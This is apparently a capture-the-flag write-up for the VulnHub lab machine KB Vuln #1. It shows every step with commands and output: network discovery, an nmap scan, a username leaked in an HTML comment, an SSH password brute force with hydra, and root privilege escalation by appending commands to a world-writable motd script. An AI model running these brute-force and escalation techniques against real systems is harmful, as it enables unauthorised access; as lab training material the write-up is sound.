
# KB Vuln #1 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/kb-vuln-1,540/


## IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.184   08:00:27:09:6b:fc      1      xx  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Port Scanning

```
$ nmap -AT4 -p- 192.168.1.184
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 17:20 EDT
Nmap scan report for 192.168.1.184
Host is up (0.00058s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.1.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 95:84:46:ae:47:21:d1:73:7d:2f:0a:66:87:98:af:d3 (RSA)
|   256 af:79:86:77:00:59:3e:ee:cf:6e:bb:bc:cb:ad:96:cc (ECDSA)
|_  256 9d:4d:2a:a1:65:d4:f2:bd:5b:25:22:ec:bc:6f:66:97 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: OneSchool &mdash; Website by Colorlib
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
```

## HTML Page Source Inspection

```
.
..
...
<!-- Username : sysadmin -->
...
..
.
```

## SSH Brute Force

```
$ hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.184

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-10 20:15:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.184:22/
[22][ssh] host: 192.168.1.184   login: sysadmin   password: password1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-10 20:15:15
```

Credentials: **sysadmin**:**password1**

## SSH Access

```
$ ssh sysadmin@192.168.1.184
The authenticity of host '192.168.1.184 (192.168.1.184)' can't be established.
ECDSA key fingerprint is SHA256:9z5jY109u48eo71sMGnTp9s13QY0KGVMI9B/m2mkCZs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.184' (ECDSA) to the list of known hosts.
sysadmin@192.168.1.184's password: password1

			WELCOME TO THE KB-SERVER

Last login: Sat Aug 22 18:00:48 2020
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

sysadmin@kb-server:~$
```

## Privilege Escalation

A file with full permission was found (/etc/update-motd.d/00-header)
```
sysadmin@kb-server:~/ftp$ ls -lah /etc/update-motd.d/00-header
-rwxrwxrwx 1 root root 989 Aug 22 17:08 /etc/update-motd.d/00-header
```

To validate the escalation, I concatenated an ID command on file end and did the SSH login again.
```
sysadmin@kb-server:~$ echo "echo \"\\nHello, I'm here\\n\$(id)\\n\"" >> /etc/update-motd.d/00-header
sysadmin@kb-server:~$ exit

$ ssh sysadmin@192.168.1.184
sysadmin@192.168.1.184's password: password1

			WELCOME TO THE KB-SERVER


Hello, I'm here
uid=0(root) gid=0(root) groups=0(root)

Last login: Sun Oct 11 00:31:48 2020 from 192.168.1.102
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

## Flag Acquiring

User Flag
```
sysadmin@kb-server:~$ cat user.txt
48a365b4ce1e322a55ae9017f3daf0c0
```

Root Flag
```
sysadmin@kb-server:~$ echo "cat /root/flag.txt" >> /etc/update-motd.d/00-header
sysadmin@kb-server:~$ exit

$ ssh sysadmin@192.168.1.184
sysadmin@192.168.1.184's password: password1

			WELCOME TO THE KB-SERVER

1eedddf9fff436e6648b5e51cb0d2ec7

Last login: Sun Oct 11 00:31:48 2020 from 192.168.1.102
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

